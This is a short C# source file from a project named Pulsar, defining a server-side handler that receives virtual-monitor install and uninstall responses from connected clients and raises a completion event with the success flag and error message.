using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Messages.Monitoring.VirtualMonitor;
using Pulsar.Common.Networking;
using Pulsar.Server.Networking;
using System;

namespace Pulsar.Server.Messages
{
    public sealed class VirtualMonitorHandler : MessageProcessorBase<object>
    {
        public event Action<Client, bool, string, bool> OperationCompleted;

        public VirtualMonitorHandler() : base(true)
        {
        }

        public override bool CanExecute(IMessage message) =>
            message is DoInstallVirtualMonitorResponse ||
            message is DoUninstallVirtualMonitorResponse;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            if (sender is Client client)
            {
                switch (message)
                {
                    case DoInstallVirtualMonitorResponse install:
                        OperationCompleted?.Invoke(client, install.Success,
                            install.Error, true);
                        break;
                    case DoUninstallVirtualMonitorResponse uninstall:
                        OperationCompleted?.Invoke(client, uninstall.Success,
                            uninstall.Error, false);
                        break;
                }
            }
        }
    }
}
